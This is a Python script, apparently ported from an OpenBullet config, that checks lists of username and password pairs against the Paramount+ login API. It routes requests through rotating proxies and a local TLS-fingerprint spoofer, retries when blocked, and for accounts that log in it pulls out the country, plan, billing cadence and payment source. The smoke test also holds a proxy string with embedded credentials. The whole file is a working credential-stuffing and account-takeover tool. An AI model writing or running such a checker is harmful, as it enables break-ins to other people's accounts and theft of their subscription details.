import asyncio
import re
import secrets
from typing import Dict, Any, Optional
from aiohttp import ClientSession

COUNTRY_MAP = {
    "AF": "Afganistan 🇦🇫", "AX": "Åland Islands 🇫🇮", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿", 
    "AS": "American Samoa 🇺🇸", "AD": "Andorra 🇦🇩", "AO": "Angola 🇦🇴", "AI": "Anguilla 🇬🇧", 
    "AQ": "Antartica ❄️", "AG": "Antigua and Barbuda 🇦🇬", "AR": "Argentina 🇦🇷", "AM": "Armenia 🇦🇲", 
    "AW": "Aruba 🇳🇱", "AU": "Australia 🇦🇺", "AT": "Austria 🇦🇹", "AZ": "Azerbaijan 🇦🇿", 
    "BS": "Bahamas 🇧🇸", "BH": "Bahrain 🇧🇭", "BD": "Bangladesh 🇧🇩", "BB": "Barbados 🇧🇧", 
    "BY": "Belarus 🇧🇾", "BE": "Belgium 🇧🇪", "BZ": "Belize 🇧🇿", "BJ": "Benin 🇧🇯", 
    "BM": "Bermuda 🇬🇧", "BT": "Bhutan 🇧🇹", "BO": "Bolivia 🇧🇴", "BQ": "Bonaire", 
    "BA": "Bosnia and Herzegovina 🇧🇦", "BW": "Botswana 🇧🇼", "BR": "Brazil 🇧🇷", 
    "IO": "British Indian Ocean Territory 🇬🇧", "VG": "British Virgin Islands 🇬🇧", 
    "BN": "Brunei 🇧🇳", "BG": "Bulgaria 🇧🇬", "BF": "Burkina Faso 🇧🇫", "BI": "Burundi 🇧🇮", 
    "KH": "Cambodia 🇰🇭", "CM": "Cameroon 🇨🇲", "CA": "Canada 🇨🇦", "IC": "Canary Islands 🇪🇸", 
    "CV": "Cape Verde 🇨🇻", "KY": "Cayman Islands 🇰🇾", "CF": "Central African Republic 🇨🇫", 
    "TD": "Chad 🇹🇩", "CL": "Chile 🇨🇱", "CN": "China 🇨🇳", "CX": "Christmas Island 🇦🇺", 
    "CC": "Cocos (Keeling) Islands 🇦🇺", "CO": "Colombia 🇨🇴", "KM": "Comoros 🇰🇲", 
    "CG": "Republic Congo 🇨🇬", "CD": "Democratic Congo 🇨🇩", "CK": "Cook Islands 🇨🇰", 
    "CR": "Costa Rica 🇨🇷", "CI": "Côte d'Ivoire 🇨🇮", "HR": "Croatia 🇭🇷", "CU": "Cuba 🇨🇺", 
    "CW": "Curaçao 🇳🇱", "CY": "Cyprus 🇨🇾", "CZ": "Czech Republic 🇨🇿", "DK": "Denmark 🇩🇰", 
    "DJ": "Djibouti 🇩🇯", "DM": "Dominica 🇩🇲", "DO": "Dominican Republic 🇩🇴", "EC": "Ecuador 🇪🇨", 
    "EG": "Egypt 🇪🇬", "SV": "El Salvador 🇸🇻", "GQ": "Equatorial Guinea 🇬🇶", "ER": "Eritrea 🇪🇷", 
    "EE": "Estonia 🇪🇪", "ET": "Eswatini 🇸🇿", "FK": "Falkland Islands 🇬🇧", "FO": "Faroe Islands 🇫🇰", 
    "FJ": "Fiji 🇫🇯", "FI": "Finland 🇫🇮", "FR": "France 🇫🇷", "GF": "French Guiana 🇫🇷", 
    "PF": "French Polynesia 🇫🇷", "TF": "French Southern Territories 🇫🇷", "GA": "Gabon 🇬🇦", 
    "GM": "Gambia 🇬🇲", "GE": "Georgia 🇬🇪", "DE": "Germany 🇩🇪", "GH": "Ghana 🇬🇭", 
    "GI": "Gibraltar 🇬🇧", "GR": "Greece 🇬🇷", "GL": "Greenland 🇩🇰", "GD": "Grenada 🇬🇩", 
    "GP": "Guadeloupe 🇫🇷", "GU": "Guam 🇺🇸", "GT": "Guatemala 🇬🇹", "GG": "Guernsey 🇬🇬", 
    "GN": "Guinea 🇬🇳", "GW": "Guinea-Bissau 🇬🇼", "GY": "Guyana 🇬🇾", "HT": "Haiti 🇭🇹", 
    "HN": "Honduras 🇭🇳", "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺", "IS": "Iceland 🇮🇸", 
    "IN": "India 🇮🇳", "ID": "Indonesia 🇮🇩", "IR": "Iran 🇮🇷", "IQ": "Iraq 🇮🇶", 
    "IE": "Ireland 🇮🇪", "IM": "Isle of Man 🇬🇧", "IL": "Israel 🇮🇱", "IT": "Italy 🇮🇹", 
    "JM": "Jamaica 🇯🇲", "JP": "Japan 🇯🇵", "JE": "Jersey 🇯🇪", "JO": "Jordan 🇯🇴", 
    "KZ": "Kazakhstan 🇰🇿", "KE": "Kenya 🇰🇪", "KI": "Kiribati 🇰🇮", "XK": "Kosovo 🇽🇰", 
    "KW": "Kuwait 🇰🇼", "KG": "Kyrgyzstan 🇰🇬", "LA": "Laos 🇱🇦", "LV": "Latvia 🇱🇻", 
    "LB": "Lebanon 🇱🇧", "LS": "Lesotho 🇱🇸", "LR": "Liberia 🇱🇷", "LY": "Libya 🇱🇾", 
    "LI": "Liechtenstein 🇱🇮", "LT": "Lithuania 🇱🇹", "LU": "Luxembourg 🇱🇺", "MO": "Macau 🇲🇴", 
    "MG": "Madagascar 🇲🇬", "MW": "Malawi 🇲🇼", "MY": "Malaysia 🇲🇾", "MV": "Maldives 🇲🇻", 
    "ML": "Mali 🇲🇱", "MT": "Malta 🇲🇹", "MH": "Marshall Islands 🇲🇭", "MQ": "Martinique 🇫🇷", 
    "MR": "Mauritania 🇲🇷", "MU": "Mauritius 🇲🇺", "YT": "Mayotte 🇫🇷", "MX": "Mexico 🇲🇽", 
    "FM": "Micronesia 🇫🇲", "MD": "Moldova 🇲🇩", "MC": "Monaco 🇲🇨", "MN": "Mongolia 🇲🇳", 
    "ME": "Montenegro 🇲🇪", "MS": "Montserrat 🇬🇧", "MA": "Morocco 🇲🇦", "MZ": "Mozambique 🇲🇿", 
    "MM": "Myanmar 🇲🇲", "NA": "Namibia 🇳🇦", "NR": "Nauru 🇳🇷", "NP": "Nepal 🇳🇵", 
    "NL": "Netherlands 🇳🇱", "NC": "New Caledonia 🇫🇷", "NZ": "New Zealand 🇳🇿", "NI": "Nicaragua 🇳🇮", 
    "NE": "Niger 🇳🇪", "NG": "Nigeria 🇳🇬", "NU": "Niue 🇳🇺", "NF": "Norfolk Island 🇦🇺", 
    "KP": "North Korea 🇰🇵", "MK": "North Macedonia 🇲🇰", "MP": "Northern Mariana Islands 🇺🇸", 
    "NO": "Norway 🇳🇴", "OM": "Oman 🇴🇲", "PK": "Pakistan 🇵🇰", "PW": "Palau 🇵🇼", 
    "PS": "Palestine 🇵🇸", "PA": "Panama 🇵🇦", "PG": "Papua New Guinea 🇵🇬", "PY": "Paraguay 🇵🇾", 
    "PE": "Peru 🇵🇪", "PH": "Philippines 🇵🇭", "PN": "Pitcairn 🇬🇧", "PL": "Poland 🇵🇱", 
    "PT": "Portugal 🇵🇹", "PR": "Puerto Rico 🇵🇷", "QA": "Qatar 🇶🇦", "RE": "Réunion 🇫🇷", 
    "RO": "Romania 🇷🇴", "RU": "Russia 🇷🇺", "RW": "Rwanda 🇷🇼", "WS": "Samoa 🇼🇸", 
    "SM": "San Marino 🇸🇲", "ST": "Sao Tome and Principe 🇸🇹", "SA": "Saudi Arabia 🇸🇦", 
    "SN": "Senegal 🇸🇳", "RS": "Serbia 🇷🇸", "SC": "Seychelles 🇸🇨", "SL": "Sierra Leone 🇸🇱", 
    "SG": "Singapore 🇸🇬", "SX": "Sint Maarten 🇳🇱", "SK": "Slovakia 🇸🇰", "SI": "Slovenia 🇸🇮", 
    "GS": "South Georgia 🇬🇸", "SB": "Solomon Islands 🇸🇧", "SO": "Somalia 🇸🇴", 
    "ZA": "South Africa 🇿🇦", "KR": "South Korea 🇰🇷", "SS": "South Sudan 🇸🇸", "ES": "Spain 🇪🇸", 
    "LK": "Sri Lanka 🇱🇰", "BL": "St. Barthélemy 🇫🇷", "SH": "Saint Helena 🇬🇧", 
    "KN": "Saint Kitts and Nevis 🇰🇳", "LC": "St. Lucia 🇱🇨", "PM": "Saint Pierre 🇫🇷", 
    "VC": "Saint Vincent 🇻🇨", "SD": "Sudan 🇸🇩", "SR": "Suriname 🇸🇷", "SZ": "Swaziland 🇸🇿", 
    "SE": "Sweden 🇸🇪", "CH": "Switzerland 🇨🇭", "SY": "Syrian Arab Republic 🇸🇾", 
    "TW": "Taiwan 🇹🇼", "TJ": "Tajikistan 🇹🇯", "TZ": "Tanzania 🇹🇿", "TH": "Thailand 🇹🇭", 
    "TL": "Timor-Leste 🇹🇱", "TG": "Togo 🇹🇬", "TK": "Tokelau 🇳🇿", "TO": "Tonga 🇹🇴", 
    "TT": "Trinidad and Tobago 🇹🇹", "TN": "Tunisia 🇹🇳", "TR": "Turkey 🇹🇷", 
    "TM": "Turkmenistan 🇹🇲", "TC": "Turks and Caicos Islands 🇬🇧", "TV": "Tuvalu 🇹🇻", 
    "UG": "Uganda 🇺🇬", "UA": "Ukraine 🇺🇦", "AE": "UAE 🇦🇪", "GB": "United Kingdom 🇬🇧", 
    "US": "United States 🇺🇸", "UY": "Uruguay 🇺🇾", "UZ": "Uzbekistan 🇺🇿", "VI": "Virgin Islands 🇺🇸", 
    "VU": "Vanuatu 🇻🇺", "VA": "Vatican 🇻🇦", "VE": "Venezuela 🇻🇪", "VN": "Vietnam 🇻🇳", 
    "WF": "Wallis and Futuna 🇫🇷", "EH": "Western Sahara 🇪🇭", "YE": "Yemen 🇾🇪", 
    "ZM": "Zambia 🇿🇲", "ZW": "Zimbabwe 🇿🇼"
}

def parse_lr(source: str, left: str, right: str) -> str:
    try:
        start = source.index(left) + len(left)
        end = source.index(right, start)
        return source[start:end]
    except ValueError:
        return ""

def format_proxy(raw_proxy: str) -> Optional[str]:
    """
    Parses OpenBullet style proxy strings.
    Matches your script's specific regex conversions:
    userpass: "^[^:]+:[^:]+:([^:]+:[^_]+(?:_.+)?)$"
    ipport: "^([^:]+:[^:]+)"
    """
    if not raw_proxy:
        return None
    try:
        userpass_match = re.search(r"^[^:]+:[^:]+:([^:]+:[^_]+(?:_.+)?)$", raw_proxy)
        ipport_match = re.search(r"^([^:]+:[^:]+)", raw_proxy)
        
        if userpass_match and ipport_match:
            userpass = userpass_match.group(1)
            ipport = ipport_match.group(1)
            return f"http://{userpass}@{ipport}"
    except Exception:
        pass
    return None

async def check_account(username: str, password: str, raw_proxy: Optional[str] = None) -> Dict[str, Any]:
    device_id = secrets.token_hex(8).lower()
    user_agent = "Mozilla/5.0 (Android; Mobile; rv:109.0) Gecko/110.0 Firefox/110.0" 
    
    # Processes the raw eclipse proxy string into curl URI format
    proxy_url = format_proxy(raw_proxy) if raw_proxy else None

    headers = {
        "x-tp-h1order": "sec-ch-ua,sec-ch-ua-mobile,sec-ch-ua-platform,upgrade-insecure-requests,user-agent,accept,sec-fetch-site,sec-fetch-mode,sec-fetch-user,sec-fetch-dest,accept-encoding,accept-language",
        "x-tp-h2order": "auto",
        "x-tp-method": "POST",
        "x-tp-h2settings": '{"mode": "auto"}',
        "x-tp-chid": "HelloIOS_16",
        "Host": "www.intl.paramountplus.com",
        "Cookie": "CBS_DEVICEID=",
        "Cache-Control": "max-age=0",
        "Traceparent": "00-c206720e0f5a4e1387706d69d577877c-10cc66f212114532-01",
        "Tracestate": "2321606@nr=0-2-2936348-766585785-10cc66f212114532----1763113514852",
        "Newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjkzNjM0OCIsImFwIjoiNzY2NTg1Nzg1IiwidHIiOiJjMjA2NzIwZTBmNWE0ZTEzODc3MDZkNjlkNTc3ODc3YyIsImlkIjoiMTBjYzY2ZjIxMjExNDUzMiIsInRpIjoxNzYzMTEzNTE0ODUyLCJ0ayI6IjIzMjE2MDYifX0=",
        "User-Agent": user_agent,
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # Injected proxy string sent as metadata command header to your TLS binary setup
    if proxy_url:
        headers["x-tp-proxy"] = proxy_url

    async with ClientSession() as session:
        # --- REQUEST 1: Authentication ---
        login_url = "https://www.intl.paramountplus.com/apps-api/v2.1/androidphone/auth/login.json?locale=en-us&at=ABC74o%2B31mI%2F%2FzQ3GstOJMJJ%2FgdJGAU5PCKXsJ%2B%2BroG%2FyHi2O754P8Ojsak4Ev7LXck%3D"
        headers["x-tp-url"] = login_url
        headers["x-tp-method"] = "POST"
        
        payload = {
            "j_username": username,
            "j_password": password,
            "deviceId": device_id
        }

        while True:
            try:
                async with session.post("http://127.0.0.1:9000", headers=headers, data=payload, timeout=120) as resp:
                    if resp.status in [500, 403, 406]:
                        continue
                    body = await resp.text()
                    break
            except Exception:
                return {"status": "ERROR", "message": "Local proxy agent unaccessible"}

        if "Invalid username/password pair" in body or '"status":400,"error":"Bad Request",' in body:
            return {"status": "FAIL"}
        
        if "userId" not in body:
            return {"status": "BAN/UNKNOWN"}

        # --- REQUEST 2: Status Check ---
        status_url = "https://www.intl.paramountplus.com/apps-api/v3.0/androidphone/login/status.json?locale=en-us&at=ABAe6KaaPmQXoXXr2FS9yDys4wXLwooaEREtz0c6agC7vrQhjTY%2FYfp1dfSDtu9EbB0%3D"
        headers["x-tp-url"] = status_url
        headers["x-tp-method"] = "GET"
        if "Content-Type" in headers:
            del headers["Content-Type"]

        while True:
            try:
                async with session.get("http://127.0.0.1:9000", headers=headers, timeout=120) as resp:
                    if resp.status in [500, 403, 406]:
                        continue
                    body2 = await resp.text()
                    break
            except Exception:
                return {"status": "ERROR", "message": "Failed connection on step 2"}

        if "NEW_FREE_PACKAGE" in body2 or '"planType":null,' in body2:
            return {"status": "FREE/CUSTOM"}

        country_code = parse_lr(body2, '"subscriptionCountry":"', '"')
        
        return {
            "status": "SUCCESS",
            "data": {
                "Country": COUNTRY_MAP.get(country_code, f"Unknown ({country_code})"),
                "Plan": parse_lr(body2, '"productName":"', '"'),
                "PlanType": parse_lr(body2, '"planType":"', '"'),
                "BillingPeriod": parse_lr(body2, '"billingCadence":"', '"'),
                "Package": parse_lr(body2, '"packageCode":"', '"'),
                "PaymentMethod": parse_lr(body2, '"packageSource":"', '"')
            }
        }

# Smoke test call passing your proxy info directly
if __name__ == "__main__":
    target_proxy = "core.eclipseproxy.com:3030:eclipse_Acho1234:3b8fe71d-eb2a-40b6-9cad-bbb1927b0e25"
    
    # Internal validation output:
    # Generates: http://eclipse_Acho1234:3b8fe71d-eb2a-40b6-9cad-bbb1927b0e25@core.eclipseproxy.com:3030
    print(f"Formatted Proxy Header Output: {format_proxy(target_proxy)}")
